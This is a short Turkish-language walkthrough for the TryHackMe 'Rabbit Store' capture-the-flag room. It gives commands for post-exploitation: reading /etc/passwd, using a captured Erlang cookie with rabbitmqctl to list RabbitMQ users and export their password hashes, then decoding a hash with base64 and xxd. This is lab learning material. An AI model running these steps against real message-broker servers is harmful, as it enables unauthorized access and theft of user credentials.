
https://0xb0b.gitbook.io/writeups/tryhackme/2025/rabbit-store

shell aldıkdan sonra 
```bash
cat /etc/passwd 
```
eğer cıktısın da:

![Resim](https://0xb0b.gitbook.io/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FxG9xN[...])

bu resimdeki gibi ise 

ve elimize cookie geçerse çözdüğümüz ctfin hostuna forge eklenir

```bash
echo "ip forge" >> /etc/hosts
```

statusa bakılır ve 
```bash
sudo rabbitmqctl --erlang-cookie 'UdEX5rcSZi5pg0ow' --node rabbit@forge status
```
userler listelenir

```bash
 sudo rabbitmqctl --erlang-cookie 'UdEX5rcSZi5pg0ow' --node rabbit@forge list_users
```

daha sonra userler ve hasheri export edilir json dosyasına yazdıırlır
``` bash
sudo rabbitmqctl --erlang-cookie 'UdEX5rcSZi5pg0ow' --node rabbit@forge export_definitions users.json
```
daha sonra bu cıkan sonucu tek komutla (algoritmasını çözme) decode etme çıkan sonuç kimin hashini aldıysak şifresidir


algoritma: 
- hash base64 ile decode edilir
- cıkan sonucu hex ile decode edilir boşluklar sinir ve ilk 8 karakter silinir daha sonra kalan ise Şifredir. 

```bash
 echo -n '49e6[REDACTED]BzWF' | base64 -d | xxd -p -c 100
e3d7ba85295d1d16[REDACTED]98073585
```

